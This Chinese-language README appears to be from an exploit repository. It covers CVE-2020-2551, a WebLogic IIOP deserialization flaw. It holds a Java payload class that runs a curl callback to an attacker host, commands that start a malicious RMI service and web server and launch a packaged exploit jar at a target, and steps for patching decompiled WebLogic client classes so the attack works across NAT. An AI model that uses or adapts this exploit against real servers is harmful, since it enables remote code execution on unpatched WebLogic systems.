## CVE-2020-2551
Weblogic IIOP 反序列化

## 测试环境
Weblogic10.3.6+jdk1.6

[打包好的jar包](https://pan.baidu.com/s/1WancKEtKzXDxwWP0zz3QPg) 提取码：a6ob 

## 漏洞利用
下载jar包，然后使用marshalsec起一个恶意的RMI服务，本地编译一个exp.java
```java
package payload;

import java.io.IOException;

public class exp {

    public exp() {
        String cmd = "curl http://172.16.1.1/success";
        try {
            Runtime.getRuntime().exec(cmd).getInputStream();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

**尽量使用和weblogic相同的jdk版本和依赖库(wlfullclient.jar)编译** 然后本地起一个web服务器

```
python -m http.server --bind 0.0.0.0 80
```

命令行运行jar包
```
java -jar weblogic_CVE_2020_2551.jar 172.16.1.128 7001 rmi://172.16.1.1:1099/exp
```
实际效果如图
![image](https://user-images.githubusercontent.com/40487319/75524749-81804100-5a49-11ea-8409-20746ca09299.gif)

## 已知问题
很多小伙伴都说复现不成功，看了网上的一些文章发现IIOP存在nat模式的问题，今天发现先知上有了 https://xz.aliyun.com/t/7498 各位自行移步。

## 参考

https://y4er.com/post/weblogic-cve-2020-2551/

https://xz.aliyun.com/t/7374

# 写在原作者后面

1、这个POC由于IIOP协议的绑定问题，存在NAT无法利用的问题

解决方案：

（1）10.3.6，在```wlfullclient.jar```中提取出```weblogic/iiop/IOPProfile.class```,反编译成java文件，修改

```
public void read(CorbaInputStream var1)
```

这个函数，进行如下修改：
```
this.host = "172.16.38.132";//addr.getAddress();目标IP

this.port = 7001;//addr.getPort();
```

（2）12.2.1.3，在wlfullclient.jar中提取出```weblogic/iiop/ior/IOPProfile.class```,反编译成java文件,修改同一个函数，但是由于IDEA对范型

反编译的问题，需要对
```
public final <T extends TaggedComponent> T getComponent(int tag)
```

这个函数进行修改，需要在return的地方，修改成：
```
return (T)component;
```
（3）其他版本的应该都是类似的情况，需根据不同情况进行调试。

2、这个POC对

```com.bea.core.repackaged.springframework.spring.jar```

```wlfullclient.jar```

这两个文件都有版本的要求，目标weblogic的版本要与你lib中的版本一致，重新编译后才能使用。其中wlfullclient.jar的生成方法是：

在weblogic的``` /u01/oracle/wlserver/server/lib（12.2.1.3）```中执行：

```java -jar wljarbuilder.jar```

目录下会生成```wlfullclient.jar```,替换POC中lib文件中的同名文件。

另外一个版本文件在```/u01/oracle/wlserver/modules/com.bea.core.repackaged.springframework.spring.jar```

3、我测试的时候，10.X版本的可以使用rmi的方式，12.2.X只能使用ldap协议

4、由于成功的必要条件比较多，比较鸡肋
